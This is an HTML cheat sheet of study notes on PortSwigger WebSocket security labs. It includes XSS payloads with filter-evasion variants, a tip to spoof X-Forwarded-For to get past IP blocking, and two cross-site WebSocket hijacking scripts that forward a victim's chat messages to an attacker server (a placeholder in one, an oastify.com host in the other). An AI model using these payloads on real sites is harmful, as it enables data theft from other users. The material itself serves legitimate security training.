<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>WebSockets</title>
  <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<header id="title-block-header">
</header>
<h1 id="websockets">WebSockets</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><p><a href="#recon">Recon for WebSockets</a></p></li>
<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
Payloads</a></p></li>
<li><p><strong>View the .pdf file in the folder for more details, the
file can be viewed inline without needing to download
it</strong></p></li>
</ul>
<p><br></p>
<h2 id="resources">Resources</h2>
<ul>
<li>https://portswigger.net/web-security/websockets</li>
</ul>
<p><br></p>
<h2 id="recon">Recon</h2>
<h3 id="identify-websockets-requests">Identify WebSockets Requests</h3>
<ul>
<li><p>On the Proxy tab in Burp Suite, there is a “WebSockets history”
section. This section will contain any WebSockets messages initiated by
the application. If this section has any requests, then the application
is using WebSockets.</p></li>
<li><p>After identifying that WebSockets are in use, the 3 labs on this
document can help to formulate ideas to attack the application.</p></li>
</ul>
<p><br></p>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<h3 id="xss-exploit">XSS Exploit</h3>
<ul>
<li>Submit an XSS payload within a parameter in the WebSocket message.
The application is returning this value without any input validation or
encoding, and it is between some HTML tags, so the data is executed as
JavaScript code.</li>
</ul>
<p><br></p>
<h3 id="xss-exploit-brute-force-bypass">XSS Exploit + Brute Force
Bypass</h3>
<ul>
<li><p>Use the WebSockets to exploit an XSS vulnerability. If the
application is blacklisting your IP address, try using the
X-Forwarded-For header to spoof the IP address. Try a variety of
different payloads depending on how the application responds.</p></li>
<li><p>Final XSS payload used backticks since the application was not
allowing to use parethesis:</p>
<ul>
<li>{“message”:“Test&lt;img src=x oNeRRoR=alert`1`&gt;”}</li>
</ul></li>
<li><p>Another payload that worked was HTML encoding the “alert”
keyword:</p>
<ul>
<li>{“message”:“&lt;img src=x
OnErRoR=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;”}</li>
</ul></li>
</ul>
<p><br></p>
<h3 id="cross-site-websocket-hijacking">Cross-site WebSocket
Hijacking</h3>
<ul>
<li><p>Identify if the WebSockets Handshake request is vulnerable to
Cross-Origin WebSocket Hijacking/CSRF attack. The handshake request can
be identified by looking for the following headers in the WebSockets
requests:</p>
<ul>
<li><p>Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==</p></li>
<li><p>Connection: keep-alive, Upgrade</p></li>
<li><p>Upgrade: websocket</p></li>
</ul></li>
<li><p>If the handshake request relies solely on session cookies and
does not contain any unpredictable parameters, then it is vulnerable to
a CSRF attack. Depending on how the application uses the WebSocket’s, we
can perform unauthorized actions or retrieve sensitive data that the
user can access.</p>
<ul>
<li><p>Example: The payload below can be used to retrieve sensitive
information from the application that belongs to another user. When we
send the “READY” command to the server via the WebSocket message, all
the past chat messages will be received. When the messages are received
from the server, they will be sent to attacker’s server. This is
possible as cross-site websocket hijacking attacks, allows for 2-way
interaction, unlike standard CSRF attacks.</p></li>
<li><p>Host the payload in the Exploit Server:</p></li>
</ul></li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> ws <span class="op">=</span> <span class="kw">new</span> <span class="bu">WebSocket</span>(<span class="st">&#39;wss://VULNERABLE-WEBSOCKET-URL&#39;</span>)<span class="op">;</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="at">onopen</span> <span class="op">=</span> <span class="kw">function</span>() {</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>        ws<span class="op">.</span><span class="fu">send</span>(<span class="st">&quot;READY&quot;</span>)<span class="op">;</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="at">onmessage</span> <span class="op">=</span> <span class="kw">function</span>(<span class="bu">event</span>) {</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fetch</span>(<span class="st">&#39;https://ATTACKER-SERVER&#39;</span><span class="op">,</span> {<span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span> <span class="dt">mode</span><span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span> <span class="dt">body</span><span class="op">:</span> <span class="bu">event</span><span class="op">.</span><span class="at">data</span>})<span class="op">;</span></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<ul>
<li>Example Exploitation Payload: Although this does not work in the
labs, this is something that can be done to inject XSS through web
socket messages to attack other users. The “message” parameter in the
lab was used to communicate/send messages to the server through web
socket.</li>
</ul>
<div class="sourceCode" id="cb2"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> ws <span class="op">=</span> <span class="kw">new</span> <span class="bu">WebSocket</span>(<span class="st">&#39;wss://0a97008101b00a8.web-security-academy.net/chat&#39;</span>)<span class="op">;</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="at">onopen</span> <span class="op">=</span> <span class="kw">function</span>() {</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>        ws<span class="op">.</span><span class="fu">send</span>(<span class="st">&quot;{</span><span class="sc">\&quot;</span><span class="st">message</span><span class="sc">\&quot;</span><span class="st">:</span><span class="sc">\&quot;</span><span class="st">&lt;img src=x onerror=alert(1)&gt;</span><span class="sc">\&quot;</span><span class="st">}&quot;</span>)<span class="op">;</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    ws<span class="op">.</span><span class="at">onmessage</span> <span class="op">=</span> <span class="kw">function</span>(<span class="bu">event</span>) {</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        <span class="fu">fetch</span>(<span class="st">&#39;https://a8jc1jg75.oastify.com&#39;</span><span class="op">,</span> {<span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span> <span class="dt">mode</span><span class="op">:</span> <span class="st">&#39;no-cors&#39;</span><span class="op">,</span> <span class="dt">body</span><span class="op">:</span> <span class="bu">event</span><span class="op">.</span><span class="at">data</span>})<span class="op">;</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br><br></p>
<h3
id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
to complete labs that are missing from cheat sheet:</h3>
<ul>
<li>All labs in this category are completed and referenced in cheat
sheet or attached document.</li>
</ul>
</body>
</html>
